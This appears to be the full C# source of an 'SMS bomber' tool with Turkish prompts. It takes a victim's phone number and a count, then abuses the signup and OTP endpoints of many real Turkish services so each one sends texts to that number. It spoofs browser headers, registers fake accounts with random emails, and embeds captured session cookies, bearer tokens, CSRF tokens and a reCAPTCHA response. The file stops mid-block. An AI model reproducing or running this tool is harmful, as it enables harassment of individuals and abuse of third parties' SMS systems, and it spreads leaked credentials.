using Newtonsoft.Json;
using System;
using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Reflection.Metadata.Ecma335;
using System.Runtime.ExceptionServices;
using System.Text;

namespace smsbomb
{
    internal class Program
    {
        static string phone = "";
        static int shouldsent = 0;
        static int sent = 0;
        static Random random = new Random();

        static string GenerateRandomString()
        {
            const string allowedChars = "qwertyuıopasdfghjklzxcvbnm0123456789_";
            StringBuilder builder = new StringBuilder(10);

            for (int i = 0; i < 10; i++)
            {
                int index = random.Next(0, allowedChars.Length);
                builder.Append(allowedChars[index]);
            }

            return builder.ToString();
        }
        static async Task Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine("   ▄████████   ▄▄▄▄███▄▄▄▄      ▄████████      ▀█████████▄   ▄██████▄    ▄▄▄▄███▄▄▄▄   ▀█████████▄  \r\n  ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███        ███    ███ ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ \r\n  ███    █▀  ███   ███   ███   ███    █▀         ███    ███ ███    ███ ███   ███   ███   ███    ███ \r\n  ███        ███   ███   ███   ███              ▄███▄▄▄██▀  ███    ███ ███   ███   ███  ▄███▄▄▄██▀  \r\n▀███████████ ███   ███   ███ ▀███████████      ▀▀███▀▀▀██▄  ███    ███ ███   ███   ███ ▀▀███▀▀▀██▄  \r\n         ███ ███   ███   ███          ███        ███    ██▄ ███    ███ ███   ███   ███   ███    ██▄ \r\n   ▄█    ███ ███   ███   ███    ▄█    ███        ███    ███ ███    ███ ███   ███   ███   ███    ███ \r\n ▄████████▀   ▀█   ███   █▀   ▄████████▀       ▄█████████▀   ▀██████▀   ▀█   ███   █▀  ▄█████████▀  \r\n                                                                                                    \r\n");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine(new string(' ', 100) + "By Kirit00");
            Console.ForegroundColor = ConsoleColor.Blue;
        top:
            Console.WriteLine("Numarayı Giriniz");
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            phone = Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("Adet Giriniz");
            shouldsent = Convert.ToInt32(Console.ReadLine());
            if (phone.Length != 10 || phone.StartsWith("0"))
            {
                Console.ForegroundColor = ConsoleColor.DarkGreen;
                Console.WriteLine("Eksik numara uzunluğu / hatalı format 0 olmadan yazmayı deneyin");
                goto top;
            }
            //hoplagit
            if (sent < shouldsent)
            using (HttpClient client = new HttpClient())
            {
                string jsonContent = "{\"phone\":\"+90" + phone + "\"}";
                StringContent content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"");
                HttpResponseMessage response = await client.PostAsync("https://api.hoplagit.com:443/v1/auth:reqSMS", content);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] Hoplagit ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] Hoplagit :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //marti
            if (sent < shouldsent)
            using (HttpClient client = new HttpClient())
            {
                string jsonContent = "{\"mobilePhone\":\"" + phone + "\",\"mobilePhoneCountryCode\":\"90\",\"confirm\":\"true\",\"oneSignalId\":\"\"}";
                StringContent content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"");
                HttpResponseMessage response = await client.PostAsync("https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin", content);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] Martı Scooter ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] Martı Scooter :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //gratis.com
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                client.DefaultRequestHeaders.Add("host", "api.cn94v1klbw-gratisicv1-p1-public.model-t.cc.commerce.ondemand.com");
                client.DefaultRequestHeaders.Add("Origin", "https://www.gratis.com");
                client.DefaultRequestHeaders.Add("Referer", "https://www.gratis.com/");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Mobile", "?0");
                client.DefaultRequestHeaders.Add("Authorization", "bearer 7b18ODf174QarTPDZkbPQ-wZrys");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform", "Windows");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "empty");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "cors");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
                client.DefaultRequestHeaders.Add("X-Requested-With", "XMLHttpRequest");
                client.DefaultRequestHeaders.Add("X-Anonymous-Consents", "%5B%5D");
                HttpResponseMessage response = await client.GetAsync("https://api.cn94v1klbw-gratisicv1-p1-public.model-t.cc.commerce.ondemand.com/gratiscommercewebservices/v2/gratis/users?phoneNumber=" + phone + "&lang=tr&curr=TRY");
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] Gratis.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] Gratis.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //evidea.com
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                string jsonContent = "{\"top_name\":\"ryan\",\"last_name\":\"gosling\",\"email\":\"" + GenerateRandomString() + "@hotmail.com\",\"password\":\"Tyler0216sad_\",\"phone\":\"0" + phone + "\",\"phone-two\":\"0" + phone + "\",\"confirm\":\"true\",\"g-recaptcha-response\":\"03AFcWeA58R-Xmr0yrAQeP2oqeez2_Z7HpyQivUNFE5q239pa15Ql8uuxgymOFkAD6H6rGOMEzbt9ORHZXELHE97YIruflMpnEJ14Gb3nKgy-7eV2rEHStZ4NDOkioiFsfwUK39cN-oSrlpHGO4Vo7dyIxwCKBZ56vap6QuOuU46O8s-nhGGh2CY63O-zmjPvVmZ9F9VvuSPswNQ5B1dU3DxJmL5HTkhBrjzsUUuwlQCW7LolkeWml_Lx63dpntblUTrmorwqTrd_mjMWaxQcXGNDqDf3wDxyMNpDKB4Mz51wASUypbJNP_1BK8rNjhBKyXhEA2iy8THy9N4ldrd6x_Ivn8tqXL03p2vEyi8-ER95MoTWDNbEwYsLjnYhHDqqUnKJQY6mE-EHhCqmq-ezj7CjbVgku6o9OXlwavFjRfVtUHWBRJ8Xnpc9qF6xX99FhraSu419PYcyC3_UQkbL1Qm9nlvXO4hYn7ncGRzgrrsy3_X-XPFfjl5xCjH3ZNptiF-3QOSxLeT2fZm5Y8dBFnQdo40bCCNxqmn_n7IxuP3Syu7UU8b0GxNw\"}";
                StringContent content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                client.DefaultRequestHeaders.Add("Cookie", "csrftoken=cWbO4TriZ53BMiuMv6uH6ofHj40uAHGtQ2fDmA5jifLBXZPnUrsGnvvsxOjETcqh; sessionid=2lr62kff84yqvlo7twtk8q8dci1v4ouj");
                client.DefaultRequestHeaders.Add("Origin", "https://www.evidea.com");
                client.DefaultRequestHeaders.Add("Referer", "https://www.evidea.com/users/register/");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Mobile", "?0");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform", "Windows");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "empty");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "cors");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
                client.DefaultRequestHeaders.Add("X-Requested-With", "XMLHttpRequest");
                HttpResponseMessage response = await client.PostAsync("https://www.evidea.com/users/register/", content);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] evidea.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] evidea.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //balikesiruludag.com.tr
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                client.DefaultRequestHeaders.Add("Cookie", "csrftoken=IsGHyjgh0IOHMMOV2KOkSWC6lV2o1Ymn32YpkUXl8zuPHpjJLZHwa4U4tSv85ahi; sessionid=mf21o5obcgcqqr0fcm8cdb5rmdkj08pq");
                client.DefaultRequestHeaders.Add("Referer", "https://balikesiruludag.com.tr/otobus-bileti/UyeOl.php");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Mobile", "?0");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform", "Windows");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "empty");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "cors");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
                client.DefaultRequestHeaders.Add("Cookie", "PHPSESSID=01g9cgiqjvu3mmmpm87t998k30");
                HttpResponseMessage response = await client.GetAsync("https://balikesiruludag.com.tr/otobus-bileti/UyeOlKontrol.php?TcKimlikNo=55429055288&CepTelefon=" + phone);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] balikesiruludag.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] balikesiruludag.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //madamecoco.com
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                string jsonContent = "{\"email\":\"" + GenerateRandomString() + "@hotmail.com\",\"top_name\":\"ryan\",\"last_name\":\"gosling\",\"date_of_birth\":\"1997-01-01\",\"password\":\"Tyleris31456156@\",\"phone\":\"0" + phone + "\",\"sms_allowed\":false,\"email_allowed\":false,\"confirm\":true,\"attributes\":{\"club\":true,\"kvkk_confirm\":false}}";
                StringContent content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                client.DefaultRequestHeaders.Add("Cookie", "csrftoken=IsGHyjgh0IOHMMOV2KOkSWC6lV2o1Ymn32YpkUXl8zuPHpjJLZHwa4U4tSv85ahi; sessionid=mf21o5obcgcqqr0fcm8cdb5rmdkj08pq");
                client.DefaultRequestHeaders.Add("Origin", "https://www.madamecoco.com");
                client.DefaultRequestHeaders.Add("Referer", "https://www.madamecoco.com/users/register/");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Mobile", "?0");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform", "Windows");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "empty");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "cors");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
                client.DefaultRequestHeaders.Add("X-Csrftoken", "O91R7l6Tr7bhW560YHTRZ0jk8gKNMqvO9JjzTWNXzYRpRIBOHWM3h8BigddxQCqJ");
                HttpResponseMessage response = await client.PostAsync("https://www.madamecoco.com/users/register/", content);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] madamecoco.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] madamecoco.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //www.e-bebek.com
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                string jsonContent = "{\"uid\":\"" + phone + "\",\"topName\":\"ryan\",\"lastName\":\"gosling\",\"email\":\"" + GenerateRandomString() + "@hotmail.com\",\"password\":\"Tyler02163450_\",\"smsAllow\":false,\"emailAllow\":false,\"userAgreement\":true,\"kvkkAllow\":true,\"registerChannel\":\"\",\"captchaResponse\":\"\"}";
                StringContent content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                client.DefaultRequestHeaders.Add("Cookie", "PHPSESSID=n70ptk03hpba3j560avb992ba4; __utmz=other; cookieconsent_status=deny");
                client.DefaultRequestHeaders.Add("Origin", "https://www.e-bebek.com");
                client.DefaultRequestHeaders.Add("Referer", "https://www.e-bebek.com/");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Mobile", "?0");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform", "Windows");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "empty");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "cors");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
                client.DefaultRequestHeaders.Add("Authorization", "bearer 0tq8_SQzGKmnh_c35GEee6SZrsM");
                client.DefaultRequestHeaders.Add("Platform", "web");
                client.DefaultRequestHeaders.Add("Sms-Validation-Token", "hy4GWOsVHYWM4gRBOTItJPDqylJP4Dp2F0S9AjQJhaQ=");
                HttpResponseMessage response = await client.PostAsync("https://api2.e-bebek.com/ebebekwebservices/v2/ebebek/users/anonymous/validate?lang=tr&curr=TRY", content);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] e-bebek.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] e-bebek.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //tazi.tech
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {

                string jsonContent = "{\"cep_tel\":\"" + phone + "\",\"cep_tel_ulkekod\":\"90\"}";
                StringContent content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Mobile", "?0");
                client.DefaultRequestHeaders.Add("Authorization", "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform", "Windows");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "empty");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "cors");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
                HttpResponseMessage response = await client.PostAsync("https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin", content);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] tazi.tech ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] tazi.tech :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //hayatsu.com
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                var formContent = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("recaptchaStatus", "true"),
                    new KeyValuePair<string, string>("mobilePhoneNumber", phone),
                });
                formContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/x-www-form-urlencoded");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                client.DefaultRequestHeaders.Add("Cookie", "ASP.NET_SessionId=idrlzhcheajlsdm0cyceurjl");
                client.DefaultRequestHeaders.Add("Host", "www.hayatsu.com.tr");
                client.DefaultRequestHeaders.Add("Origin", "https://www.hayatsu.com.tr");
                client.DefaultRequestHeaders.Add("Referer", "https://www.hayatsu.com.tr/uye-ol");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Mobile", "?0");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform", "Windows");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "empty");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "cors");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
                client.DefaultRequestHeaders.Add("X-Requested-With", "XMLHttpRequest");
                HttpResponseMessage response = await client.PostAsync("https://www.hayatsu.com.tr/SignUp/SendOtp", formContent);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] hayatsu.com ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] hayatsu.com :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //www.mopas.com.tr
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                client.DefaultRequestHeaders.Add("Host", "mopas.com.tr");
                client.DefaultRequestHeaders.Add("Referer", "https://mopas.com.tr/login");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua", "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Mobile", "?0");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform", "Windows");
                client.DefaultRequestHeaders.Add("Cookie", "BNI_persistence=-oMuwJWTY8xe9gAXchZ7LZIV_9pUzvcHq4fB0KCvuV1cM6UJrhvXajog7HuniIzXPVd-0J2eO82uc8TcndacvQ==; delivery_zone=mopas; BNI_persistence=-oMuwJWTY8xe9gAXchZ7LZIV_9pUzvcHq4fB0KCvuV1cM6UJrhvXajog7HuniIzXPVd-0J2eO82uc8TcndacvQ==; x-bni-fpc=3b6d4c233d4c22afdedb06145c5c4be9; JSESSIONID=A1E1722EC14B945B505D96502E64E590; iszone_updated=mopas; BNES_iszone_updated=HJGcUNfxntKWQx0VEYHWJsg0ZzFa7CzJo7ewjqcyzaU2tyo/Kjwmx9swLV8Zyaqt3EjmY+qpPfZ2N3D+k+qFZQ==; BNES_delivery_zone=+wwSTY+XlAUS/p9B1DEyTCXhQnT9UvCGHn6MRMk243rr/f5txSYG7pFftM0lxLFKHK7b0OikvnI=; BNES_BNES_iszone_updated=v7ZRHdbJd1P2tGvaHqw81uPMgmDXIYD55fD6i8LwJyyB0hEgcndLTTYtw/PPBfhV9n6s/B3zNffVdaSc/f9l7Dn7vB5z5B1tpIYvq4Ym+lfQYC7D85Swq5GTbgxWeSLRFuXC+oxjzLVRYdNk0kr9R5d1FgLpBrjmMnXaqTU+BR9mHvBe0e80glsR4DInwNkGrnGTaqtGK6g=; BNES_BNES_delivery_zone=RzYPFbkBua5Mx/oUp9XRodORktChfAig6pD//jGbFCP5r5DrD6DU0r4yNRWRbiqPbv9khZmfDsjpi3ZnoKgeUJN4pgfoahnsBe2bHWDhqsY/8AYNWHWN+RSMCfVgoEMmb3cd3sqHzGTZ8p+INPg4l5wUNiVRf6Qu+7eCL/7JUjMG49b8uZbSig==; x-bni-rncf=1694697775705; BNES_JSESSIONID=tFNA3HKPWT0cnlAGsfOrWWqadcN4CNu9x6ZGpvQgPNrujICwoUwNwOwpdfLnNKnYTYpeIU+VY6qeWib+aR9JF2cFZvZp6vNhJpU0x0ZemRo=; BNES_BNES_JSESSIONID=HofAUFek5vMdZ1EhQbw0tWaPfzNj0KctPfrOSJ/aMD3zHBKJt8AjQCRf9Js0A67BXerKDMyreXhr5n0mnTk8DWJ3ouqkdgKAwoRd/Xzda62THLHzlkz/48B6wKLJLXXBaNVHXT8Zm0GnOXaDBxyEUYSUsrsFnaxHDsp8VvBKpxQS9WpX7FXRTNsB9080dTGXhu0n5Y0K5Bmhxn+rAxHfFXDKyoHyexS+");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "empty");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "cors");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
                client.DefaultRequestHeaders.Add("X-Requested-With", "XMLHttpRequest");
                HttpResponseMessage response = await client.GetAsync("https://mopas.com.tr/sms/activation?mobileNumber=" + phone + "&pwd=&checkPwd=");
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] mopas.com.tr ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] mopas.com.tr :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //www.boyner.com.tr
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                string jsonContent = "{\"Main\":{\"CellPhone\":" + phone + ",\"lastname\":\"gosling\",\"topname\":\"Tylser\",\"Email\":\"" + GenerateRandomString() + "@hotmail.com\",\"Password\":\"Tyler0216\",\"ReceiveCampaignMessages\":false,\"GenderID\":1}";
                StringContent content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                client.DefaultRequestHeaders.Add("Token", "05e3edda-719d-4802-8a13-35f136723799");
                client.DefaultRequestHeaders.Add("Osversion", "1");
                client.DefaultRequestHeaders.Add("Phonetype", "1");
                client.DefaultRequestHeaders.Add("Platform", "1");
                client.DefaultRequestHeaders.Add("X-Is-Web", "true");
                client.DefaultRequestHeaders.Add("Storeid", "1");
                client.DefaultRequestHeaders.Add("Api-Version", "5");
                client.DefaultRequestHeaders.Add("Appversion", "0.1.0");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform", "Windows");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Des", "empty");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "cors");
                client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-site");
                client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Mobile", "?0");
                HttpResponseMessage response = await client.PostAsync("https://mobileapi-redesign.boyner.com.tr/mobile2/mbUser/RegisterUser", content);
                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] boyner.com.tr ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                    sent++;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[x] boyner.com.tr :" + response.StatusCode + " ----> +90 " + phone.Substring(0, 3) + " " + phone.Substring(3, 3) + " " + phone.Substring(6, 2) + phone.Substring(8));
                }
            }
            //www.defacto.com.tr
            if (sent < shouldsent)
                using (HttpClient client = new HttpClient())
            {
                var formContent = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("email", GenerateRandomString()+"@hotmail.com"),
                    new KeyValuePair<string, string>("__RequestVerificationToken", "j08GzaFVhBe7OMiLwuCZtWhfOCWrqFypvQFW91jvHBekVXLTdM4C4G7RN98ICTgssVnmlF5KMGNB6NDdqcQZklCOjP81"),
                    new KeyValuePair<string, string>("mobilePhone", "0" + phone),
                });
                formContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/x-www-form-urlencoded");
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
                client.DefaultRequestHeaders.Add("cookie", "DF.l145=h9JBjpqqRTpySQUFpos4oowU7yRjlpUdNUzETlkBwzaUA1jDmX15Bp97qYlQ6lqTU3Glfc1v9okH78PPaQrJyPbRSylWZnpQk3jnUMg2w6su/vjjTJ1qEb9Tqt0B0TzYVYo5XpeW3Bl1991lyEvfmy3nF0O/bkm7CeQufETJTbNJ6pnFMWsYhJgp9qvt+fTboOWyw3x2vMcn75CphMTcq9fGq2eynhqSWfnpd4luBYwk7hIC3Xn57uSWCkEOuPe9rv+4wVlXXUkjYJF5XnaGgw==; currentculture=tr-tr; DF.Customer.V3=c7ce6b17-ec2e-4196-91c0-e46f4fe371ec; __RequestVerificationToken=SbOkk55kMaxU7ZZ4tlag7poqISw7YuzK4e1zcu1tmcFBhTLRlhwuHia6DGoHAWxr0awzuk_UfB5QbbjQRxsQQlx62K41; miniCartCount=0; G_ENABLED_IDPS=google");
